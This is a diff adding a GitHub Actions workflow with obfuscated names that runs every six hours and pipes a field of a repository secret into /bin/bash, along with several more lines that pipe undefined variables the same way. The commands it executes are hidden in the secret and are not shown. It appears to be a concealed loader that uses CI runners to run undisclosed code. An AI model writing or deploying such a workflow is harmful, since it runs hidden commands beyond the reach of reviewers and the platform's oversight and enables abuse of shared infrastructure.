@@ -1,0 +1,26 @@
+name: taofeiji3489
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: taofeiji3489
+        env:
+          psf7: ${{ secrets.psf7 }}
+        run: |
+          echo $psf7 | jq -r .xut307 | /bin/bash
+          echo $zdozh51 | jq -r .nuog550 | /bin/bash
+          echo $qvbf8 | jq -r .sg89888 | /bin/bash
+          echo $tgiiv21096 | jq -r .egv4487 | /bin/bash
+          echo $z245 | jq -r .sd85 | /bin/bash
+          echo $vbcq719 | jq -r .mkm61415 | /bin/bash
+          echo $ore301 | jq -r .aemg253 | /bin/bash
+          echo $tl38 | jq -r .q4 | /bin/bash
+          echo $vo252 | jq -r .nhwmq5198 | /bin/bash
+          echo $qx68 | jq -r .l06 | /bin/bash
+
